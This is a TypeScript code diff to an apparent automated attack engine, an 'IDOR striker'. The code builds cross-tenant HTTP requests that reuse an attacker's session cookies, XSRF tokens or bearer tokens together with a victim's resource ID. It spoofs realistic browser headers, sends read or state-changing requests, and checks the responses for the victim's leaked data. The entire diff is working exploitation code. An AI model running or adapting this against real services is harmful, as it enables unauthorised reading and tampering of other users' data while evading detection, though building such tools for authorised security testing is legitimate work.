@@ -17,6 +17,44 @@ export const REALISTIC_BROWSER_HEADERS: Record<string, string> = {
 };
 
 /**
+ * Merges realistic browser headers with session-specific headers (Cookie, X-XSRF-TOKEN, custom auth)
+ * or falls back to standard Bearer token authentication when no raw session headers are supplied.
+ */
+export function buildSessionHeaders(
+  token: string,
+  sessionHeaders?: Record<string, string>,
+  extraHeaders?: Record<string, string>
+): Record<string, string> {
+  const merged: Record<string, string> = { ...REALISTIC_BROWSER_HEADERS };
+
+  const setCaseInsensitive = (key: string, value: string) => {
+    const lower = key.toLowerCase();
+    for (const existing of Object.keys(merged)) {
+      if (existing.toLowerCase() === lower) {
+        delete merged[existing];
+      }
+    }
+    merged[key] = value;
+  };
+
+  if (sessionHeaders && Object.keys(sessionHeaders).length > 0) {
+    for (const [k, v] of Object.entries(sessionHeaders)) {
+      setCaseInsensitive(k, v);
+    }
+  } else if (token) {
+    setCaseInsensitive('Authorization', token.includes(' ') ? token : `Bearer ${token}`);
+  }
+
+  if (extraHeaders) {
+    for (const [k, v] of Object.entries(extraHeaders)) {
+      setCaseInsensitive(k, v);
+    }
+  }
+
+  return merged;
+}
+
+/**
  * DUAL-TOKEN IDOR STRIKER (XBOW Core Engine)
  * Takes a victim's resource ID and constructs cross-tenant requests authenticated as the attacker.
  */
@@ -47,35 +85,33 @@ export class IdorStriker {
       }
     }
 
-    // If path didn't have a template placeholder, check if it ends with / or append query
-    if (!replaced) {
+    // If path didn't have a template placeholder and doesn't already include the victim resource ID, append it
+    if (!replaced && !resolvedPath.includes(context.victimResourceId)) {
       if (resolvedPath.endsWith('/')) {
         resolvedPath += context.victimResourceId;
-      } else {
+      } else if (endpoint.sourceBundle !== 'curl_ingress') {
         const queryChar = resolvedPath.includes('?') ? '&' : '?';
         resolvedPath += `${queryChar}id=${encodeURIComponent(context.victimResourceId)}`;
       }
     }
 
     const fullUrl = `${baseUrl.replace(/\/$/, '')}/${resolvedPath.replace(/^\//, '')}`;
+    const defaultMutateBody = endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined;
+    const requestBody = endpoint.sampleBody ?? defaultMutateBody;
 
-    // Read attack candidate with human-like browser headers and dual-token baseline
+    // Read/Mutate attack candidate with human-like browser headers and dual-session baseline
     candidates.push({
       vector: endpoint.isStateMutating ? 'IDOR_MUTATE_VIOLATION' : 'IDOR_READ_VIOLATION',
       targetUrl: fullUrl,
       method: endpoint.method,
-      headers: {
-        ...REALISTIC_BROWSER_HEADERS,
-        'Authorization': `Bearer ${context.attackerToken}`,
+      headers: buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
         'Content-Type': 'application/json',
-      },
-      baselineHeaders: {
-        ...REALISTIC_BROWSER_HEADERS,
-        'Authorization': `Bearer ${context.victimToken}`,
+      }),
+      baselineHeaders: buildSessionHeaders(context.victimToken, context.victimHeaders, {
         'Content-Type': 'application/json',
-      },
-      body: endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined,
-      baselineBody: endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined,
+      }),
+      body: requestBody,
+      baselineBody: requestBody,
       expectedLeakFragment: context.victimSecretIdentifier || context.victimResourceId,
     });
 
